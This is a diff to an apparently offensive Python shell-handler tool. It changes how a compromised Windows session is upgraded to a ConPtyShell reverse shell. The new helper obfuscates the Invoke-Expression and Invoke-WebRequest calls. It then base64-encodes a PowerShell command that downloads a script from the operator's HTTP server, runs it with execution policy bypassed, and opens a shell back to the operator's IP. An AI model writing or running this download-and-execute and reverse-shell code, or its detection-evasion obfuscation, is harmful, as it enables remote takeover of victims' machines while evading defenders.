@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import base64
 import shutil
 import threading
 import time
@@ -8,7 +9,7 @@ from typing import Callable, Dict, Optional
 
 from koi.session import Session
 from koi.utils.cache import load_conptyshell, save_conptyshell, cache_exists, conpty_cache_path
-from koi.utils.ps_obfuscate import obfuscate_conptyshell
+from koi.utils.ps_obfuscate import obfuscate_conptyshell, _obfuscate_call
 from koi.utils.tcp import spawn_http_server
 from koi.utils.ui import Spinner, notify, _b, _p
 
@@ -16,6 +17,20 @@ _CONPTYSHELL_URL = (
     "https://raw.githubusercontent.com/antonioCoco/ConPtyShell"
     "/master/Invoke-ConPtyShell.ps1"
 )
+
+
+def _build_invoke_cmd(
+    local_ip: str, http_port: int, port: int, rows: int, cols: int, conpty_fn: str
+) -> str:
+    iex = _obfuscate_call("Invoke-Expression")
+    iwr = _obfuscate_call("Invoke-WebRequest")
+    inner = (
+        f"{iex}({iwr} 'http://{local_ip}:{http_port}/c.ps1' -UseBasicParsing);"
+        f"{conpty_fn} -RemoteIp {local_ip} -RemotePort {port}"
+        f" -Rows {rows} -Cols {cols} -CommandLine powershell"
+    )
+    encoded = base64.b64encode(inner.encode("utf-16-le")).decode()
+    return f"powershell -nop -ep bypass -enc {encoded}"
 
 
 def _fetch_conptyshell() -> tuple[bytes, str]:
@@ -65,12 +80,7 @@ def upgrade_windows_conptyshell(
     http_port, http_thread = spawn_http_server(ps1_data, timeout=60.0)
     notify('info', f"Serving ConPtyShell on port {_b(http_port)}")
 
-    invoke_cmd = (
-        f"powershell -nop -ep bypass -c \""
-        f"IEX(IWR 'http://{local_ip}:{http_port}/c.ps1' -UseBasicParsing);"
-        f"{conpty_fn} -RemoteIp {local_ip} -RemotePort {port}"
-        f" -Rows {rows} -Cols {cols} -CommandLine powershell\""
-    )
+    invoke_cmd = _build_invoke_cmd(local_ip, http_port, port, rows, cols, conpty_fn)
 
     notify('info',
         f"Invoking ConPtyShell on session {_p(f'#{sess.id}')}, callback {_b(mask_ip(local_ip, 'local'))}:{_b(port)}"
